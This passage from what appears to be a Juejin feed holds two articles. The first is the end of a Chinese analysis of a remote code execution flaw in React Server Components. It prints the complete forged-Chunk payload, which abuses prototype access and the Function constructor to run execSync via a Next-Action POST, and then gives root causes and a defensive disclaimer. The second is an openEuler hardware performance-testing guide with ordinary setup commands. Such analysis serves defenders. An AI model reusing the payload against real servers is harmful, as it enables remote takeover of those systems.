<p><strong>结果：</strong> Payload 的 <code>then</code> 属性现在持有了 <code>Chunk.prototype.then</code>，使该 Payload 对象变为了一个 <strong>Thenable</strong> 对象。</p>
<hr/>
<h4 data-id="heading-37">阶段 5: 获取 Function 构造函数</h4>
<p>当 <code>$1:constructor:constructor</code> 被解析时：</p>
<pre><code class="hljs language-ini" lang="ini">$1:constructor:constructor
    ↓
<span class="hljs-attr">path</span> = [<span class="hljs-string">"1"</span>, <span class="hljs-string">"constructor"</span>, <span class="hljs-string">"constructor"</span>]
    ↓
<span class="hljs-attr">chunk1.value</span> = chunk0 (解析后的对象)
    ↓
<span class="hljs-attr">value</span> = chunk0[<span class="hljs-string">"constructor"</span>]    // = Object
    ↓
<span class="hljs-attr">value</span> = Object[<span class="hljs-string">"constructor"</span>]    // = Function 构造函数
</code></pre>
<p><strong>结果：</strong> <code>_formData.get</code> 属性变成了 <strong>Function 构造函数</strong>。</p>
<hr/>
<h4 data-id="heading-38">阶段 6: 伪造 Chunk 被视为真实 Chunk</h4>
<p><strong>文件:</strong> <code>packages/react-server/src/ReactFlightReplyServer.js</code></p>
<p><strong>代码 (135-137 行):</strong></p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">switch</span> (chunk.<span class="hljs-property">status</span>) {
  <span class="hljs-keyword">case</span> <span class="hljs-attr">RESOLVED_MODEL</span>:         <span class="hljs-comment">// Payload 具有 status: "resolved_model"</span>
    <span class="hljs-title function_">initializeModelChunk</span>(chunk);  <span class="hljs-comment">// 使用 PAYLOAD 作为 "chunk" 调用!</span>
</code></pre>
<p>Payload 完美地<strong>模仿</strong>了 Chunk 的结构：</p>






























<table><thead><tr><th>Chunk 属性</th><th>Payload 值</th><th>目的</th></tr></thead><tbody><tr><td><code>status</code></td><td><code>"resolved_model"</code></td><td>匹配 <code>RESOLVED_MODEL</code> 常量</td></tr><tr><td><code>value</code></td><td><code>"{\"then\":\"$B1337\"}"</code></td><td>待解析的内部 Payload</td></tr><tr><td><code>reason</code></td><td><code>-1</code></td><td>模仿 Chunk ID</td></tr><tr><td><code>_response</code></td><td><code>{...malicious...}</code></td><td><strong>注入的恶意 Response 对象</strong></td></tr></tbody></table>
<hr/>
<h4 data-id="heading-39">阶段 7: 恶意 Response 对象注入</h4>
<p><strong>文件:</strong> <code>packages/react-server/src/ReactFlightReplyServer.js</code></p>
<p><strong>代码 (446-474 行):</strong></p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">initializeModelChunk</span>(<span class="hljs-params">chunk</span>) {
  <span class="hljs-comment">// ...</span>
  <span class="hljs-keyword">const</span> resolvedModel = chunk.<span class="hljs-property">value</span>;     <span class="hljs-comment">// = "{\"then\":\"$B1337\"}"</span>
  <span class="hljs-comment">// ...</span>
  <span class="hljs-keyword">const</span> rawModel = <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">parse</span>(resolvedModel);

  <span class="hljs-keyword">const</span> value = <span class="hljs-title function_">reviveModel</span>(
    chunk.<span class="hljs-property">_response</span>,  <span class="hljs-comment">// ← 使用伪造的 _response!</span>
    {<span class="hljs-string">''</span>: rawModel},
    <span class="hljs-string">''</span>,
    rawModel,
    rootReference,
  );
}
</code></pre>
<p>伪造的 <code>_response</code> 包含：</p>
<pre><code class="hljs language-javascript" lang="javascript">{
  <span class="hljs-string">"_prefix"</span>: <span class="hljs-string">"process.mainModule.require('child_process').execSync('say haha');"</span>,
  <span class="hljs-string">"_formData"</span>: {<span class="hljs-string">"get"</span>: <span class="hljs-title class_">Function</span>}  <span class="hljs-comment">// 已经解析为 Function 构造函数!</span>
}
</code></pre>
<p><strong>关键问题：</strong> 没有验证 <code>chunk._response</code> 是否为合法的 Response 对象。</p>
<hr/>
<h4 data-id="heading-40">阶段 8: 通过 $B 引用执行代码</h4>
<p><strong>文件:</strong> <code>packages/react-server/src/ReactFlightReplyServer.js</code></p>
<p><strong>代码 (1059-1067 行):</strong></p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">case</span> <span class="hljs-string">'B'</span>: {  <span class="hljs-comment">// Blob 引用</span>
  <span class="hljs-keyword">const</span> id = <span class="hljs-built_in">parseInt</span>(value.<span class="hljs-title function_">slice</span>(<span class="hljs-number">2</span>), <span class="hljs-number">16</span>);  <span class="hljs-comment">// 0x1337 = 4919</span>
  <span class="hljs-keyword">const</span> prefix = response.<span class="hljs-property">_prefix</span>;           <span class="hljs-comment">// 恶意代码字符串</span>
  <span class="hljs-keyword">const</span> blobKey = prefix + id;               <span class="hljs-comment">// "process.mainModule...execSync('say haha');4919"</span>

  <span class="hljs-keyword">const</span> backingEntry = response.<span class="hljs-property">_formData</span>.<span class="hljs-title function_">get</span>(blobKey);  <span class="hljs-comment">// Function(blobKey)!</span>
  <span class="hljs-keyword">return</span> backingEntry;
}
</code></pre>
<h5 data-id="heading-41">执行流程</h5>
<pre><code class="hljs language-javascript" lang="javascript">response.<span class="hljs-property">_formData</span>.<span class="hljs-title function_">get</span>(blobKey)
    ↓
<span class="hljs-comment">// _formData.get 已经被替换为 Function 构造函数</span>
<span class="hljs-title class_">Function</span>(<span class="hljs-string">"process.mainModule.require('child_process').execSync('say haha');4919"</span>)
    ↓
<span class="hljs-comment">// 返回一个匿名函数，函数体为:</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">anonymous</span>(<span class="hljs-params"/>) {
  process.<span class="hljs-property">mainModule</span>.<span class="hljs-built_in">require</span>(<span class="hljs-string">'child_process'</span>).<span class="hljs-title function_">execSync</span>(<span class="hljs-string">'say haha'</span>);
  <span class="hljs-number">4919</span>
}
</code></pre>
<hr/>
<h4 data-id="heading-42">阶段 9: 最终触发 —— RCE</h4>
<p>返回的 Function 对象变成了内部对象 <code>{then: &lt;Function&gt;}</code> 的 <code>then</code> 属性。</p>
<p>当 Promise 解析遇到这个 Thenable 对象时：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// JavaScript Promise 内部机制:</span>
<span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> value.<span class="hljs-property">then</span> === <span class="hljs-string">'function'</span>) {
  value.<span class="hljs-title function_">then</span>(resolve, reject);  <span class="hljs-comment">// 调用恶意函数！</span>
}
</code></pre>
<p><strong>调用该函数将执行：</strong></p>
<pre><code class="hljs language-javascript" lang="javascript">process.<span class="hljs-property">mainModule</span>.<span class="hljs-built_in">require</span>(<span class="hljs-string">'child_process'</span>).<span class="hljs-title function_">execSync</span>(<span class="hljs-string">'say haha'</span>)
</code></pre>
<p><strong>🔴 RCE 达成。</strong></p>
<hr/>
<h3 data-id="heading-43">漏洞利用流程可视化</h3>
<pre><code class="hljs language-javascript" lang="javascript">┌───────────────────────────────────────────────────────────────────────┐
│                         <span class="hljs-variable constant_">PAYLOAD</span> 结构                                  │
├───────────────────────────────────────────────────────────────────────┤
│ <span class="hljs-title class_">Field</span> <span class="hljs-string">"0"</span>: {                                                          │
│   <span class="hljs-string">"then"</span>: <span class="hljs-string">"$1:__proto__:then"</span>,     ──────► 窃取 <span class="hljs-title class_">Chunk</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">then</span>  │
│   <span class="hljs-string">"status"</span>: <span class="hljs-string">"resolved_model"</span>,       ──────► 模仿 <span class="hljs-title class_">Chunk</span>                │
│   <span class="hljs-string">"value"</span>: <span class="hljs-string">"{\"then\":\"$B1337\"}"</span>, ──────► 内部 <span class="hljs-title class_">Payload</span>              │
│   <span class="hljs-string">"_response"</span>: {                                                      │
│     <span class="hljs-string">"_prefix"</span>: <span class="hljs-string">"execSync('say haha');"</span>,  ──► 待执行代码                │
│     <span class="hljs-string">"_formData"</span>: {<span class="hljs-string">"get"</span>: <span class="hljs-string">"$1:constructor:constructor"</span>}  ──► <span class="hljs-title class_">Function</span>  │
│   }                                                                   │
│ }                                                                     │
│                                                                       │
│ <span class="hljs-title class_">Field</span> <span class="hljs-string">"1"</span>: <span class="hljs-string">"$@0"</span>   ──────► 创建指向 <span class="hljs-title class_">Field</span> <span class="hljs-number">0</span> 的循环引用                 │
│ <span class="hljs-title class_">Field</span> <span class="hljs-string">"2"</span>: <span class="hljs-string">"[]"</span>    ──────► 空数组占位符                               │
└───────────────────────────────────────────────────────────────────────┘

                              ▼

┌─────────────────────────────────────────────────────────────────────┐
│                         利用链 (<span class="hljs-variable constant_">EXPLOITATION</span> <span class="hljs-variable constant_">CHAIN</span>)                  │
├─────────────────────────────────────────────────────────────────────┤
│  <span class="hljs-number">1.</span> 服务端收到带有 <span class="hljs-title class_">Next</span>-<span class="hljs-title class_">Action</span> 标头的 <span class="hljs-variable constant_">POST</span> 请求                         │
│  <span class="hljs-number">2.</span> <span class="hljs-title function_">decodeAction</span>() → <span class="hljs-title function_">getRoot</span>() → 调用 .<span class="hljs-title function_">then</span>() (第 <span class="hljs-number">75</span> 行)             │
│  <span class="hljs-number">3.</span> $1:<span class="hljs-attr">__proto__</span>:then → 窃取 <span class="hljs-title class_">Chunk</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">then</span>                   │
│  <span class="hljs-number">4.</span> $1:<span class="hljs-attr">constructor</span>:constructor → 获取 <span class="hljs-title class_">Function</span> 构造函数              │
│  <span class="hljs-number">5.</span> <span class="hljs-title class_">Payload</span> 对象变为 <span class="hljs-title class_">Thenable</span> (拥有 .<span class="hljs-property">then</span> 方法)                       │
│  <span class="hljs-number">6.</span> <span class="hljs-title class_">Promise</span> 解析 <span class="hljs-title class_">Payload</span> → 视为 <span class="hljs-title class_">Chunk</span> 处理 → initializeModelChunk    │
│  <span class="hljs-number">7.</span> 使用带有恶意 _prefix 和 _formData.<span class="hljs-property">get</span> 的伪造 _response            │
│  <span class="hljs-number">8.</span> $B1337 → <span class="hljs-title class_">Function</span>(<span class="hljs-string">"malicious code"</span>) 被调用                      │
│  <span class="hljs-number">9.</span> 返回的函数被用作 .<span class="hljs-title function_">then</span>() → 被执行                                  │
│ <span class="hljs-number">10.</span> <span class="hljs-attr">RCE</span>: process.<span class="hljs-property">mainModule</span>.<span class="hljs-built_in">require</span>(<span class="hljs-string">'child_process'</span>).<span class="hljs-title function_">execSync</span>()     │
└─────────────────────────────────────────────────────────────────────┘
</code></pre>
<hr/>
<h3 data-id="heading-44">根因总结</h3>






























<table><thead><tr><th>位置</th><th>行号</th><th>漏洞</th></tr></thead><tbody><tr><td><code>ReactFlightReplyServer.js</code></td><td>614-615</td><td>未经净化的属性路径遍历允许访问 <code>__proto__</code> 和 <code>constructor</code></td></tr><tr><td><code>ReactFlightReplyServer.js</code></td><td>137</td><td>具有匹配 <code>status</code> 属性的伪造对象被当作真实 Chunk 处理</td></tr><tr><td><code>ReactFlightReplyServer.js</code></td><td>468-474</td><td>使用 <code>chunk._response</code> 时未验证其是否为合法的 Response 对象</td></tr><tr><td><code>ReactFlightReplyServer.js</code></td><td>1066</td><td>调用 <code>_formData.get()</code> 时未验证其是否为真实的 FormData 方法</td></tr></tbody></table>
<h3 data-id="heading-45">免责声明</h3>
<p>本分析仅供<strong>教育和防御性安全目的</strong>使用。提供这些信息是为了帮助理解、检测和防止此类漏洞的利用。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[多元算力融合实践：openEuler在中等配置硬件环境下的性能验证]]></title>    <link>https://juejin.cn/post/7579846685072113718</link>    <guid>https://juejin.cn/post/7579846685072113718</guid>    <pubDate>2025-12-05T03:27:13.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7579846685072113718" data-draft-id="7579893536105873414" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="多元算力融合实践：openEuler在中等配置硬件环境下的性能验证"/> <meta itemprop="keywords" content="后端"/> <meta itemprop="datePublished" content="2025-12-05T03:27:13.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="不是笨小孩135"/> <meta itemprop="url" content="https://juejin.cn/user/3252774571621179"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            多元算力融合实践：openEuler在中等配置硬件环境下的性能验证
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3252774571621179/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    不是笨小孩135
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-05T03:27:13.000Z" title="Fri Dec 05 2025 03:27:13 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-05
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读11分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">1. 前言</h2>
<ul>
<li>在数字基础设施高速发展的今天，算力需求正朝着多元化、密集化、分布式方向演进。从中小企业的日常数据处理、开发者的AI模型训练，到边缘设备的轻量化推理，不同场景对算力的形态、性能、能效提出了差异化要求。openEuler
作为面向数字基础设施的开源操作系统，凭借创新的技术架构与优化能力，实现了对中高端通用硬件算力的深度适配与高效调度，为各类计算场景提供了统一、可靠、高性能的技术底座。</li>
<li>本文将通过真实场景的部署与性能测试，深度探索 openEuler 在 CPU 通用算力、GPU   加速算力、单机分布式算力等多维度的支持能力，以具体操作流程与实测数据为依据，展现其在多样性算力调度、性能优化、生态适配等方面的技术价值。所有测试均基于Linux 环境，操作流程简洁易懂，硬件配置选用主流中等规格，旨在为广大开发者提供可复现的实践参考，共同挖掘开源操作系统的算力潜力。</li>
</ul>
<p>openEuler官网：<a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.openeuler.org%2Fen%2F" target="_blank" title="https://www.openeuler.org/en/" ref="nofollow noopener noreferrer">www.openeuler.org/en/</a>
<img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/abaf76035c6a46d7b408d8ef751b772a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5LiN5piv56yo5bCP5a2pMTM1:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765510033&amp;x-signature=fkXHd4YJYyTPjOt6tgqwwREMdz0%3D" alt="在这里插入图片描述" loading="lazy"/></p>
<h2 data-id="heading-1">2. 测试环境与基础配置</h2>
<h3 data-id="heading-2">硬件环境准备</h3>
<p>本次测试选用市场主流的中等配置硬件组合，覆盖单机通用算力、GPU 加速算力等核心场景，配置贴近开发者日常使用环境，具体如下：</p>
<ul>
<li>主测试节点：Intel Core i7-11700K 处理器（8 核 16 线程，主频 3.6GHz，最大睿频 5.0GHz，支持AVX-512 指令集）；32GB DDR4-3200 内存（双通道，单条 16GB）；512GB NVMe SSD 系统盘 + 2TBSATA III 机械硬盘数据盘；</li>
<li>GPU 加速模块：NVIDIA GeForce RTX 3060 显卡（12GB 显存，支持 CUDA 11.7 与 Tensor Core 技术，PCIe 4.0 接口）；</li>
<li>辅助测试节点：AMD Ryzen 5 5600X 处理器（6 核 12 线程，主频 3.7GHz）；16GB DDR4-3200 内存；1TB NVMe SSD；无独立 GPU，用于验证纯 CPU 算力场景。</li>
</ul>
<h3 data-id="heading-3">系统基础配置</h3>
<p>本次测试使用 openEuler 22.03 LTS 版本，系统安装遵循开源社区标准流程，无需复杂定制，重点完成以下基础配置以保障算力调度效率，所有操作均通过命令行完成，简洁易执行：</p>
<h4 data-id="heading-4">1. 系统内核优化验证与启用：openEuler 默认集成创新的算力调度优化，无需手动编译内核，通过以下命令验证并启用关键特性：</h4>
<pre><code class="hljs language-cpp" lang="cpp"># 验证 NUMA 调度优化（适配多核心 CPU 算力分配）
cat /sys/kernel/debug/sched/features | grep -i numa
# 验证透明大页启用状态（优化内存访问效率）
cat /sys/kernel/mm/transparent_hugepage/enabled
# 若未启用，执行以下命令临时启用（重启后失效，永久启用需修改配置文件）
echo <span class="hljs-string">"always"</span> &gt; /sys/kernel/mm/transparent_hugepage/enabled
# 验证内存大页配置
grep HugePages /proc/meminfo
</code></pre>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/67bcd08a884a40feba989cdc1be0dddb~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5LiN5piv56yo5bCP5a2pMTM1:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765510033&amp;x-signature=Fo41Gyqzl0DttKuJEnBzFIpQcss%3D" alt="在这里插入图片描述" loading="lazy"/></p>
<p>输出：</p>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-meta"># cat /sys/kernel/debug/sched/features | grep -i numa</span>
NUMA_BALANCE
NUMA_HINTING
NUMA_AFFINITY
</code></pre>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b82c43ab42ee476ba8249002fef875b5~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5LiN5piv56yo5bCP5a2pMTM1:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765510033&amp;x-signature=GX7T8ZhXwI2cifWhNSRsRfYv7x8%3D" alt="在这里插入图片描述" loading="lazy"/></p>
<p>输出：</p>
<pre><code class="hljs language-cpp" lang="cpp">[always] madvise never
</code></pre>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/45ae39cfec1741a797d6d5ad7d7063a9~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5LiN5piv56yo5bCP5a2pMTM1:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765510033&amp;x-signature=kqXP%2FYwC5SeGwY4edBPEZfDhZMs%3D" alt="在这里插入图片描述" loading="lazy"/></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0b05c2b73c7a4d77b6056322fa793ee0~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5LiN5piv56yo5bCP5a2pMTM1:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765510033&amp;x-signature=JhHmuhoeG48AYGHYVzgkMdYrbg0%3D" alt="在这里插入图片描述" loading="lazy"/></p>
<p>输出：</p>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-meta"># grep HugePages /proc/meminfo</span>
AnonHugePages:    <span class="hljs-number">942080</span> kB
ShmemHugePages:        <span class="hljs-number">0</span> kB
FileHugePages:         <span class="hljs-number">0</span> kB
HugePages_Total:       <span class="hljs-number">32</span>
HugePages_Free:        <span class="hljs-number">28</span>
HugePages_Rsvd:         <span class="hljs-number">4</span>
HugePages_Surp:         <span class="hljs-number">0</span>
Hugepagesize:       <span class="hljs-number">2048</span> kB
Hugetlb:            <span class="hljs-number">65536</span> kB
</code></pre>
<h3 data-id="heading-5">2. GPU 驱动与加速库适配：</h3>
<p>GPU 算力发挥依赖驱动与 CUDA 环境，openEuler 提供完善的驱动适配支持，操作流程如下：</p>
<pre><code class="hljs language-cpp" lang="cpp"># 安装驱动依赖包
sudo dnf install kernel-devel gcc make kernel-headers -y
# 禁用 nouveau 开源驱动（避免与 NVIDIA 官方驱动冲突）
sudo echo <span class="hljs-string">"blacklist nouveau"</span> &gt;&gt; /etc/modprobe.d/blacklist.conf
sudo dracut -f /boot/initramfs-$(uname -r).img $(uname -r)
sudo reboot  # 重启系统生效
# 安装 NVIDIA 官方驱动（通过 openEuler 兼容源）
sudo dnf config-manager --add-repo=https:<span class="hljs-comment">//developer.download.nvidia.com/compute/cuda/repos/rhel8/x86_64/cuda-rhel8.repo</span>
sudo dnf install cuda-drivers<span class="hljs-number">-515.65</span><span class="hljs-number">.01</span> -y
# 安装 CUDA Toolkit <span class="hljs-number">11.7</span>
sudo dnf install cuda-toolkit<span class="hljs-number">-11</span><span class="hljs-number">-7</span> -y
# 配置环境变量
echo <span class="hljs-string">'export PATH=/usr/local/cuda-11.7/bin:$PATH'</span> &gt;&gt; ~/.bashrc
echo <span class="hljs-string">'export LD_LIBRARY_PATH=/usr/local/cuda-11.7/lib64:$LD_LIBRARY_PATH'</span> &gt;&gt; ~/.bashrc
source ~/.bashrc
# 验证 CUDA 环境
nvcc -V  # 查看 CUDA 版本
nvidia-smi  # 查看 GPU 状态与驱动版本

基础依赖与测试工具安装：安装测试所需的编程语言、框架与工具，openEuler 软件源已预集成大部分依赖，一键安装即可：
# 安装 Python 与开发工具
sudo dnf install -y python3 python3-pip
# 安装 AI 框架与性能测试库
pip3 install torch==<span class="hljs-number">2.1</span><span class="hljs-number">.2</span> torchvision==<span class="hljs-number">0.16</span><span class="hljs-number">.2</span> psutil mlflow fio
# 验证框架安装
python3 -c <span class="hljs-string">"import torch; print(f'PyTorch版本: {torch.__version__}'); print(f'CUDA可用: {torch.cuda.is_available()}')"</span>
</code></pre>
<h3 data-id="heading-6">3.3. 基础依赖与测试工具安装：</h3>
<p>安装测试所需的编程语言、框架与工具，openEuler 软件源已预集成大部分依赖，一键安装即可：</p>
<pre><code class="hljs language-cpp" lang="cpp"># 安装 Python 与开发工具
sudo dnf install -y python3 python3-pip
# 安装 AI 框架与性能测试库
pip3 install torch==<span class="hljs-number">2.1</span><span class="hljs-number">.2</span> torchvision==<span class="hljs-number">0.16</span><span class="hljs-number">.2</span> psutil mlflow fio
# 验证框架安装
python3 -c <span class="hljs-string">"import torch; print(f'PyTorch版本: {torch.__version__}'); print(f'CUDA可用: {torch.cuda.is_available()}')"</span>
</code></pre>
<p>输出：</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/aeaa61af8525414583799894bed6dcbd~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5LiN5piv56yo5bCP5a2pMTM1:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765510033&amp;x-signature=DFp%2Fpn2dDoF3G%2FdGJeHBMEGiq38%3D" alt="在这里插入图片描述" loading="lazy"/>
<img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/738f098e8e5847afa76f938250c7d359~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5LiN5piv56yo5bCP5a2pMTM1:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765510033&amp;x-signature=Y1DCftaV%2F5JfU5na8BIKuW5GtsM%3D" alt="在这里插入图片描述" loading="lazy"/>
<img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/540ef5abb6814e10889355c80c963864~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5LiN5piv56yo5bCP5a2pMTM1:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765510033&amp;x-signature=Olg0ou3mf3CIXp%2BCSxfRmzuUdX0%3D" alt="在这里插入图片描述" loading="lazy"/></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c23f41cf316640af9ee48fb61259bcd4~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5LiN5piv56yo5bCP5a2pMTM1:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765510033&amp;x-signature=XBcjnhB%2FFbRZrwbxDSZjAAXOeig%3D" alt="在这里插入图片描述" loading="lazy"/></p>
<h3 data-id="heading-7">测试工具与基准框架说明</h3>
<p>为全面、客观评估 openEuler 的多样性算力支持能力，选用业界主流且易用的测试工具与框架，所有工具均无需复杂配置，直接通过命令行或简单脚本调用：</p>
<ul>
<li>CPU 算力测试：C 语言原生编写的浮点运算测试脚本（矩阵乘法）、内存带宽与延迟测试脚本；</li>
